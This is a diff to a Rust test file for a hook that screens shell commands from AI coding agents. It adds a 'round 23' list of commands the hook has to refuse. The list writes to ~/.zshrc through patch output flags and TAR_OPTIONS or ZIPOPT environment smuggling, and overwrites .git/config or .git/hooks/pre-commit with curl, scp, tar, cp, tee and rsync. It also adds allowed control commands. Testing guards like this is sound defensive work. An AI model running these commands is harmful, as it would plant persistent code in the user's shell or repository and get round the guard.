@@ -799,6 +799,45 @@ const ROUND_22_CONTROLS: &[&str] = &[
     "rsync -a src/ ./dest/",
 ];
 
+/// Round 23: each table field read by every caller. A written path joined
+/// with the writer's directory (finding 1), a written path from the
+/// option environment (finding 2), and every writer onto the integrity
+/// paths on git-guard (finding 3). The project and the home are siblings,
+/// so `src/../../state` is the home.
+const ROUND_23: &[(&str, &str)] = &[
+    (RULE, "patch -d src -o ../../state/.zshrc a.txt fix.diff"),
+    (RULE, "patch -d src -r ../../state/.zshrc a.txt fix.diff"),
+    (RULE, "TAR_OPTIONS=\"--file=$HOME/.zshrc\" tar -c ."),
+    (RULE, "export TAR_OPTIONS=\"--file=$HOME/.zshrc\"; tar -c ."),
+    (GIT, "TAR_OPTIONS=\"-f $HOME/.gitconfig\" tar -c ."),
+    (RULE, "ZIPOPT=\"-O $HOME/.zshrc\" zip a.zip f"),
+    (GIT, "ditto payload.txt .git/config"),
+    (GIT, "ditto payload.txt .git/hooks/pre-commit"),
+    (GIT, "scp payload.txt .git/config"),
+    (GIT, "scp payload.txt .git/hooks/pre-commit"),
+    (GIT, "curl -o .git/config https://example.invalid/x"),
+    (
+        GIT,
+        "curl -o .git/hooks/pre-commit https://example.invalid/x",
+    ),
+    (GIT, "tar -cf .git/config payload.txt"),
+    (GIT, "tar -cf .git/hooks/pre-commit payload.txt"),
+    (GIT, "cp payload.txt .git/config"),
+    (GIT, "printf x | tee .git/hooks/pre-commit"),
+    (GIT, "rsync -a src out/ --log-file=.git/config"),
+];
+
+/// Round 23's controls: a home path only inside the diff, an option
+/// environment that names no file, reading a protected file, listing an
+/// archive, and a known rsync option.
+const ROUND_23_CONTROLS: &[&str] = &[
+    "patch -p0 -i fix.diff",
+    "TAR_OPTIONS=-v tar -cf out.tar src",
+    "cp ~/.gitconfig /tmp/backup",
+    "tar -tf ~/.gitconfig",
+    "rsync -a --compress-level=9 src/ out/",
+];
+
 /// The round lines Grok's own shell tool allows, in its camelCase payload.
 fn grok_shell_allows(project: &Project) -> Vec<String> {
     let grok_shell = ROUND_16
@@ -812,7 +851,8 @@ fn grok_shell_allows(project: &Project) -> Vec<String> {
         )
         .chain(ROUND_20.iter().map(|command| (RULE, *command)))
         .chain(ROUND_21.iter().copied())
-        .chain(ROUND_22.iter().copied());
+        .chain(ROUND_22.iter().copied())
+        .chain(ROUND_23.iter().copied());
     let mut wrong = Vec::new();
     for (rule, command) in grok_shell {
         let payload = json!({
@@ -872,11 +912,12 @@ fn installed_hooks_refuse_unresolved_forms_beside_a_named_target() {
             .iter()
             .map(|command| (RULE, *command))
             .chain(ROUND_21.iter().copied())
-            .chain(ROUND_22.iter().copied());
+            .chain(ROUND_22.iter().copied())
+            .chain(ROUND_23.iter().copied());
         for (rule, command) in later {
             let outputs = project.replay(harness, "Bash", json!({"command": command}));
             if !refused_with(&outputs, rule) {
-                wrong.push(format!("{harness}: rounds 20 to 22: allowed {command}"));
+                wrong.push(format!("{harness}: rounds 20 to 23: allowed {command}"));
             }
         }
         for (finding, rule, command) in ROUND_16 {
@@ -904,6 +945,7 @@ fn installed_hooks_refuse_unresolved_forms_beside_a_named_target() {
             .chain(ROUND_20_CONTROLS)
             .chain(ROUND_21_CONTROLS)
             .chain(ROUND_22_CONTROLS)
+            .chain(ROUND_23_CONTROLS)
         {
             let outputs = project.replay(harness, "Bash", json!({"command": command}));
             if outputs.iter().any(|o| !o.status.success()) {
